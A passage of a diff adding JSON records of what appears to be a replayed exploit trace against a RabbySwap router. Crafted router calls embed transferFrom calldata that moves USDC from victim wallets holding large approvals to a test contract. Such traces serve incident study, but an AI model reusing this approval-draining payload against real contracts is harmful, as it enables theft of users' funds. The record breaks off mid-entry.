+    {
+        "id": "862",
+        "args": "0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3315",
+        "args": "0xE451DC0948F33B1261c585f0DB84cca9Ab69F3A4",
+        "original_code": null,
+        "description": null,
+        "return_value": "250050796 [2.5e8]"
+    },
+    {
+        "id": "2529",
+        "args": "0xE451DC0948F33B1261c585f0DB84cca9Ab69F3A4",
+        "original_code": null,
+        "description": null,
+        "return_value": "250050796 [2.5e8]"
+    },
+    {
+        "id": "3426",
+        "args": "0xE451DC0948F33B1261c585f0DB84cca9Ab69F3A4, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007912335876158 [1.157e77]"
+    },
+    {
+        "id": "2637",
+        "args": "0xE451DC0948F33B1261c585f0DB84cca9Ab69F3A4, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007912335876158 [1.157e77]"
+    },
+    {
+        "id": "42626",
+        "args": "USDT_TOKEN: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4660, USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd000000000000000000000000e451dc0948f33b1261c585f0db84cca9ab69f3a40000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000ee778ec, 1665486251 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5258",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1356",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "13592",
+        "args": "0xE451DC0948F33B1261c585f0DB84cca9Ab69F3A4, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 250050796 [2.5e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12797",
+        "args": "0xE451DC0948F33B1261c585f0DB84cca9Ab69F3A4, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 250050796 [2.5e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "708",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000 [1e20]"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3315",
+        "args": "0xd38023D7Ee559672fA00eA5156734710bcc0e781",
+        "original_code": null,
+        "description": null,
+        "return_value": "23000000 [2.3e7]"
+    },
+    {
+        "id": "2529",
+        "args": "0xd38023D7Ee559672fA00eA5156734710bcc0e781",
+        "original_code": null,
+        "description": null,
+        "return_value": "23000000 [2.3e7]"
+    },
+    {
+        "id": "3426",
+        "args": "0xd38023D7Ee559672fA00eA5156734710bcc0e781, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913049639935 [1.157e77]"
+    },
+    {
+        "id": "2637",
+        "args": "0xd38023D7Ee559672fA00eA5156734710bcc0e781, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913049639935 [1.157e77]"
+    },
+    {
+        "id": "42626",
+        "args": "USDT_TOKEN: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4660, USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd000000000000000000000000d38023d7ee559672fa00ea5156734710bcc0e7810000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000015ef3c0, 1665486251 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5258",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1356",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "13592",
+        "args": "0xd38023D7Ee559672fA00eA5156734710bcc0e781, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 23000000 [2.3e7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12797",
+        "args": "0xd38023D7Ee559672fA00eA5156734710bcc0e781, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 23000000 [2.3e7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "708",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000 [1e20]"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3315",
+        "args": "0x059c1592696D430E7bA8cccC984BA9639b8CF90B",
+        "original_code": null,
+        "description": null,
+        "return_value": "482827947 [4.828e8]"
+    },
+    {
+        "id": "2529",
+        "args": "0x059c1592696D430E7bA8cccC984BA9639b8CF90B",
+        "original_code": null,
+        "description": null,
+        "return_value": "482827947 [4.828e8]"
+    },
+    {
+        "id": "3426",
+        "args": "0x059c1592696D430E7bA8cccC984BA9639b8CF90B, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]"
+    },
+    {
+        "id": "2637",
+        "args": "0x059c1592696D430E7bA8cccC984BA9639b8CF90B, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]"
+    },
+    {
+        "id": "42626",
+        "args": "USDT_TOKEN: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4660, USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd000000000000000000000000059c1592696d430e7ba8cccc984ba9639b8cf90b0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000001cc75eab, 1665486251 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5258",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1356",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "13592",
+        "args": "0x059c1592696D430E7bA8cccC984BA9639b8CF90B, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 482827947 [4.828e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12797",
+        "args": "0x059c1592696D430E7bA8cccC984BA9639b8CF90B, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 482827947 [4.828e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "708",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000 [1e20]"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3315",
+        "args": "0x69AfE88F22F416fFB7d2Bf119b31EBc0D0d85325",
+        "original_code": null,
+        "description": null,
+        "return_value": "936810074 [9.368e8]"
+    },
+    {
+        "id": "2529",
+        "args": "0x69AfE88F22F416fFB7d2Bf119b31EBc0D0d85325",
+        "original_code": null,
+        "description": null,
+        "return_value": "936810074 [9.368e8]"
+    },
+    {
+        "id": "3426",
+        "args": "0x69AfE88F22F416fFB7d2Bf119b31EBc0D0d85325, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115000000 [1.15e8]"
+    },
+    {
+        "id": "2637",
+        "args": "0x69AfE88F22F416fFB7d2Bf119b31EBc0D0d85325, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115000000 [1.15e8]"
+    },
+    {
+        "id": "3315",
+        "args": "0xD506Fb416B0ad8DBf7859B9B38c435405E3d1110",
+        "original_code": null,
+        "description": null,
+        "return_value": "186131595 [1.861e8]"
+    },
+    {
+        "id": "2529",
+        "args": "0xD506Fb416B0ad8DBf7859B9B38c435405E3d1110",
+        "original_code": null,
+        "description": null,
+        "return_value": "186131595 [1.861e8]"
+    },
+    {
+        "id": "3426",
+        "args": "0xD506Fb416B0ad8DBf7859B9B38c435405E3d1110, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913119639935 [1.157e77]"
+    },
+    {
+        "id": "2637",
+        "args": "0xD506Fb416B0ad8DBf7859B9B38c435405E3d1110, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913119639935 [1.157e77]"
+    },
+    {
+        "id": "42626",
+        "args": "USDT_TOKEN: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4660, USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd000000000000000000000000d506fb416b0ad8dbf7859b9b38c435405e3d11100000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000b18248b, 1665486251 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5258",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1356",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "13592",
+        "args": "0xD506Fb416B0ad8DBf7859B9B38c435405E3d1110, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 186131595 [1.861e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12797",
+        "args": "0xD506Fb416B0ad8DBf7859B9B38c435405E3d1110, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 186131595 [1.861e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "708",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000 [1e20]"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3315",
+        "args": "0xe7b6804A9fE8aDEb109112A8A2CF40093E0d55fc",
+        "original_code": null,
+        "description": null,
+        "return_value": "173000000 [1.73e8]"
+    },
+    {
+        "id": "2529",
+        "args": "0xe7b6804A9fE8aDEb109112A8A2CF40093E0d55fc",
+        "original_code": null,
+        "description": null,
+        "return_value": "173000000 [1.73e8]"
+    },
+    {
+        "id": "3426",
+        "args": "0xe7b6804A9fE8aDEb109112A8A2CF40093E0d55fc, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913074639935 [1.157e77]"
+    },
+    {
+        "id": "2637",
+        "args": "0xe7b6804A9fE8aDEb109112A8A2CF40093E0d55fc, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913074639935 [1.157e77]"
+    },
+    {
+        "id": "42626",
+        "args": "USDT_TOKEN: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4660, USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd000000000000000000000000e7b6804a9fe8adeb109112a8a2cf40093e0d55fc0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000a4fc540, 1665486251 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5258",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1356",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "13592",
+        "args": "0xe7b6804A9fE8aDEb109112A8A2CF40093E0d55fc, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 173000000 [1.73e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12797",
+        "args": "0xe7b6804A9fE8aDEb109112A8A2CF40093E0d55fc, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 173000000 [1.73e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "708",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000 [1e20]"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3315",
+        "args": "0xeEBbAf298bb8B5076723d69AF61bf75a5C2ad8d6",
+        "original_code": null,
+        "description": null,
+        "return_value": "14242424 [1.424e7]"
+    },
+    {
+        "id": "2529",
+        "args": "0xeEBbAf298bb8B5076723d69AF61bf75a5C2ad8d6",
+        "original_code": null,
+        "description": null,
+        "return_value": "14242424 [1.424e7]"
+    },
+    {
+        "id": "3426",
+        "args": "0xeEBbAf298bb8B5076723d69AF61bf75a5C2ad8d6, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913124639935 [1.157e77]"
+    },
+    {
+        "id": "2637",
+        "args": "0xeEBbAf298bb8B5076723d69AF61bf75a5C2ad8d6, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913124639935 [1.157e77]"
+    },
+    {
+        "id": "42626",
+        "args": "USDT_TOKEN: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4660, USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd000000000000000000000000eebbaf298bb8b5076723d69af61bf75a5c2ad8d60000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000d95278, 1665486251 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5258",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1356",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "13592",
+        "args": "0xeEBbAf298bb8B5076723d69AF61bf75a5C2ad8d6, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 14242424 [1.424e7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12797",
+        "args": "0xeEBbAf298bb8B5076723d69AF61bf75a5C2ad8d6, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 14242424 [1.424e7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "708",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000 [1e20]"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3315",
+        "args": "0x1Fc550e98aD3021e32C47A84019F77a0792c60B7",
+        "original_code": null,
+        "description": null,
+        "return_value": "17752439989 [1.775e10]"
+    },
+    {
+        "id": "2529",
+        "args": "0x1Fc550e98aD3021e32C47A84019F77a0792c60B7",
+        "original_code": null,
+        "description": null,
+        "return_value": "17752439989 [1.775e10]"
+    },
+    {
+        "id": "3426",
+        "args": "0x1Fc550e98aD3021e32C47A84019F77a0792c60B7, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007912629639935 [1.157e77]"
+    },
+    {
+        "id": "2637",
+        "args": "0x1Fc550e98aD3021e32C47A84019F77a0792c60B7, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007912629639935 [1.157e77]"
+    },
+    {
+        "id": "42626",
+        "args": "USDT_TOKEN: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4660, USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd0000000000000000000000001fc550e98ad3021e32c47a84019f77a0792c60b70000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000042220bcb5, 1665486251 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5258",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1356",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "13592",
+        "args": "0x1Fc550e98aD3021e32C47A84019F77a0792c60B7, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 17752439989 [1.775e10]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12797",
+        "args": "0x1Fc550e98aD3021e32C47A84019F77a0792c60B7, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 17752439989 [1.775e10]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "708",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000 [1e20]"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1315",
